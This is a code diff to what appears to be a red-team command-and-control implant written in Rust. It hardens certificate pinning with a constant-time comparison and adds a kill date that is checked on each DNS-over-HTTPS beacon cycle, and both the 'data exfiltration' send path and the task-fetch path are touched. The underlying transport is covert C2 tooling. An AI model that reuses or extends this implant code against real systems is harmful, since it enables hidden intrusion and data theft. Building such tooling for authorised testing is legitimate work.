@@ -48,6 +48,7 @@ use async_trait::async_trait;
 use base64::Engine;
 use common::{CryptoSession, Message, Transport};
 use sha2::{Digest, Sha256};
+use subtle::ConstantTimeEq;
 use std::sync::atomic::{AtomicU32, Ordering};
 use std::sync::Arc;
 use tokio::time::Duration;
@@ -107,11 +108,12 @@ impl rustls_0_21::client::ServerCertVerifier for FingerprintVerifier {
         let hex_fp = hex::encode(digest);
 
         if let Some(ref expected) = self.expected_fingerprint {
-            if hex_fp != expected.to_lowercase() {
+            // Constant-time comparison to prevent timing side-channel attacks
+            // that could brute-force the expected fingerprint byte-by-byte.
+            let expected_lower = expected.to_lowercase();
+            if !hex_fp.as_bytes().ct_eq(expected_lower.as_bytes()).into() {
                 log::error!(
-                    "cert pinning: fingerprint mismatch (got {}, expected {})",
-                    hex_fp,
-                    expected
+                    "cert pinning: fingerprint mismatch — rejecting connection"
                 );
                 return Err(rustls_0_21::Error::InvalidCertificate(
                     rustls_0_21::CertificateError::UnknownIssuer,
@@ -232,6 +234,10 @@ pub struct DohTransport {
     /// Legacy fields from common config for backward compat.
     doh_beacon_sentinel: String,
     host_header: String,
+    /// Kill date from the malleable profile (YYYY-MM-DD). Checked on every
+    /// send/recv cycle so that a passing kill date causes graceful termination
+    /// even while the agent is long-running.
+    kill_date: String,
 }
 
 impl DohTransport {
@@ -251,6 +257,9 @@ impl DohTransport {
             .unwrap_or_else(|| "1.2.3.4".to_string());
         let host_header = common_profile
             .map(|p| p.host_header.clone())
+            .unwrap_or_default();
+        let kill_date = common_profile
+            .map(|p| p.kill_date.clone())
             .unwrap_or_default();
 
         // Build default headers for DoH.
@@ -297,6 +306,7 @@ impl DohTransport {
             session_id: rand::random(),
             doh_beacon_sentinel,
             host_header,
+            kill_date,
         })
     }
 
@@ -698,6 +708,11 @@ impl Transport for DohTransport {
     async fn send(&mut self, msg: Message) -> Result<()> {
         log::debug!("Malleable DoH C2 Send (data exfiltration)");
 
+        // Enforce kill date on every send cycle.
+        if !self.kill_date.is_empty() {
+            crate::config::check_kill_date(&self.kill_date)?;
+        }
+
         // Serialize and encrypt the payload.
         let serialized = bincode::serialize(&msg)?;
         let ciphertext = self.session.encrypt(&serialized);
@@ -737,6 +752,11 @@ impl Transport for DohTransport {
 
     async fn recv(&mut self) -> Result<Message> {
         log::debug!("Malleable DoH C2 Recv (task fetch)");
+
+        // Enforce kill date on every recv cycle.
+        if !self.kill_date.is_empty() {
+            crate::config::check_kill_date(&self.kill_date)?;
+        }
 
         // Beacon loop: query for tasking availability.
         loop {
@@ -883,6 +903,7 @@ mod tests {
             session_id: 0xDEADBEEF,
             doh_beacon_sentinel: "1.2.3.4".to_string(),
             host_header: String::new(),
+            kill_date: String::new(),
         };
 
         // With data.
@@ -910,6 +931,7 @@ mod tests {
             session_id: 0xDEADBEEF,
             doh_beacon_sentinel: "1.2.3.4".to_string(),
             host_header: "fallback.example.com".to_string(),
+            kill_date: String::new(),
         };
 
         // Should use the profile's dns_suffix, not the host_header.
@@ -928,6 +950,7 @@ mod tests {
             session_id: 0xDEADBEEF,
             doh_beacon_sentinel: "1.2.3.4".to_string(),
             host_header: String::new(),
+            kill_date: String::new(),
         };
 
         let json = serde_json::json!({
@@ -957,6 +980,7 @@ mod tests {
             session_id: 0xDEADBEEF,
             doh_beacon_sentinel: "1.2.3.4".to_string(),
             host_header: String::new(),
+            kill_date: String::new(),
         };
 
         let json = serde_json::json!({
@@ -982,6 +1006,7 @@ mod tests {
             session_id: 0xDEADBEEF,
             doh_beacon_sentinel: "1.2.3.4".to_string(),
             host_header: String::new(),
+            kill_date: String::new(),
         };
 
         let wire = transport.build_dns_wireformat("test.example.com", "A").unwrap();
